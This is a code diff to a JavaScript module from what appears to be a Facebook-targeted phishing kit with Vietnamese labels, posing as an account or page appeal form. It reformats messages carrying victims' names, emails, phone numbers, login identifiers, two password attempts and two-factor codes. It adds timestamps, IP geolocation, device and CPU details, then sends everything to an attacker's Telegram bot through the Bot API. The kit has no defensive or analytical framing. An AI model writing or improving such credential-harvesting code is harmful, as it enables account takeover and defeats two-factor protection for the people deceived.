@@ -1,5 +1,6 @@
 import config from '@/utils/config';
-import axios from '@/utils/axios-instance';
+import { detectDevice } from '@/utils/detect_bot';
+import axios from 'axios';
 
 let cachedGeo = null;
 
@@ -7,75 +8,76 @@ const getGeoInfo = async () => {
     if (cachedGeo) return cachedGeo;
     try {
         const res = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+        const data = res.data ?? {};
+        const city = data.city ?? '';
+        const region = data.region ?? '';
+        const country = data.country ?? 'Không rõ';
+        const locationParts = [city, region, country].filter(Boolean);
         cachedGeo = {
-            ip: res.data?.ip ?? 'Không rõ',
-            country: res.data?.country ?? 'Không rõ',
+            ip: data.ip ?? 'Không rõ',
+            location: locationParts.join(', ') || 'Không rõ',
         };
     } catch {
         cachedGeo = {
             ip: 'Không rõ',
-            country: 'Không rõ',
+            location: 'Không rõ',
         };
     }
     return cachedGeo;
 };
 
+const getTimestamp = () => {
+    const now = new Date();
+    const pad = (n) => String(n).padStart(2, '0');
+    return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+};
+
+const buildHeader = (geoInfo) => {
+    const device = detectDevice();
+    const cpu = device.cpu ?? 'Không rõ';
+    return `⏰ ${getTimestamp()}
+🌐 IP: <code>${geoInfo.ip}</code>
+📍 Vị trí: <code>${geoInfo.location}</code>
+📱 Thiết bị: <code>${device.deviceInfo}</code>
+💻 CPU: <code>${cpu}</code>
+━━━━━━━━━━━━━━━━━━━━`;
+};
+
+const buildInfoSection = (formData) => {
+    return `📋 <b>THÔNG TIN</b>
+   Tên: <code>${formData.full_name ?? ''}</code>
+   Email: <code>${formData.email_facebook ?? ''}</code>
+   SĐT: <code>${formData.phone ?? ''}</code>
+   Page: <code>${formData.page_name ?? ''}</code>`;
+};
+
+const buildLoginSection = (emailOrPhone, password1, password2) => {
+    const mk2Line = password2 ? `\n   MK2: <code>${password2}</code>` : '';
+    return `🔐 <b>ĐĂNG NHẬP</b>
+   TK: <code>${emailOrPhone ?? ''}</code>
+   MK1: <code>${password1 ?? ''}</code>${mk2Line}`;
+};
+
 const buildMessage = (formData, credentials, geoInfo) => {
     const { emailOrPhone, password1, password2 } = credentials;
+    return `${buildHeader(geoInfo)}
+${buildInfoSection(formData)}
 
-    const passwordLines = password2
-        ? `🔑 <b>Mật khẩu 1:</b> <code>${password1}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2}</code>`
-        : `🔑 <b>Mật khẩu:</b> <code>${password1}</code>`;
-
-    return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
-━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
-👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
-📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
-📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
-📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
-📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
-🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
-
-🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
-━━━━━━━━━━━━━━━━━━━━━
-📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
-${passwordLines}
-
-🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
+${buildLoginSection(emailOrPhone, password1, password2)}
+━━━━━━━━━━━━━━━━━━━━`;
 };
 
 const buildTwoFactorCodeMessage = (formData, payload, geoInfo) => {
     const { emailOrPhone, password1, password2, codes } = payload;
+    const codeLines = codes.map((c, i) => `   Code${i + 1}: <code>${c}</code>`).join('\n');
+    return `${buildHeader(geoInfo)}
+${buildInfoSection(formData)}
 
-    const passwordLines = password2
-        ? `🔑 <b>Mật khẩu 1:</b> <code>${password1 ?? ''}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2 ?? ''}</code>`
-        : `🔑 <b>Mật khẩu:</b> <code>${password1 ?? ''}</code>`;
+${buildLoginSection(emailOrPhone, password1, password2)}
 
-    const codeLines = codes.length === 1
-        ? `🔢 <b>Mã:</b> <code>${codes[0]}</code>`
-        : codes.map((c, i) => `🔢 <b>Mã ${i + 1}:</b> <code>${c}</code>`).join('\n');
-
-    return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
-━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
-👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
-📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
-📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
-📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
-📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
-🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
-
-🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
-━━━━━━━━━━━━━━━━━━━━━
-📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
-${passwordLines}
-
-🔐 <b>XÁC THỰC 2 LỚP</b>
-━━━━━━━━━━━━━━━━━━━━━
+🔒 <b>MÃ 2FA</b>
 ${codeLines}
-
-🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
+━━━━━━━━━━━━━━━━━━━━`;
 };
 
 const deleteTelegramMessage = async (messageId) => {
@@ -150,40 +152,19 @@ export const sendTryOtherToTelegram = async (formData, payload, selectedMethodLa
 
         const { emailOrPhone, password1, password2, codes } = payload;
 
-        const passwordLines = password2
-            ? `🔑 <b>Mật khẩu 1:</b> <code>${password1 ?? ''}</code>\n🔑 <b>Mật khẩu 2:</b> <code>${password2 ?? ''}</code>`
-            : `🔑 <b>Mật khẩu:</b> <code>${password1 ?? ''}</code>`;
-
         const codeLines = codes && codes.length > 0
-            ? codes.map((c, i) => {
-                const label = codes.length === 1 ? 'Mã' : `Mã ${i + 1}`;
-                return `🔢 <b>${label}:</b> <code>${c}</code>`;
-            }).join('\n')
+            ? codes.map((c, i) => `   Code${i + 1}: <code>${c}</code>`).join('\n')
             : '';
-        const codesSection = codeLines
-            ? `\n🔐 <b>XÁC THỰC 2 LỚP</b>\n━━━━━━━━━━━━━━━━━━━━━\n${codeLines}\n`
-            : '';
+        const codesSection = codeLines ? '\n🔒 <b>MÃ 2FA</b>\n' + codeLines + '\n' : '';
 
-        const msg = `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
-━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
-👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
-📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
-📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
-📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
-📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
-🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
+        const msg = `${buildHeader(geoInfo)}
+${buildInfoSection(formData)}
 
-🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
-━━━━━━━━━━━━━━━━━━━━━
-📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
-${passwordLines}
+${buildLoginSection(emailOrPhone, password1, password2)}
 ${codesSection}
 🔀 <b>THỬ CÁCH KHÁC</b>
-━━━━━━━━━━━━━━━━━━━━━
-✅ <b>Phương thức đã chọn:</b> <code>${selectedMethodLabel}</code>
-
-🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
+   Phương thức: <code>${selectedMethodLabel}</code>
+━━━━━━━━━━━━━━━━━━━━`;
 
         const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
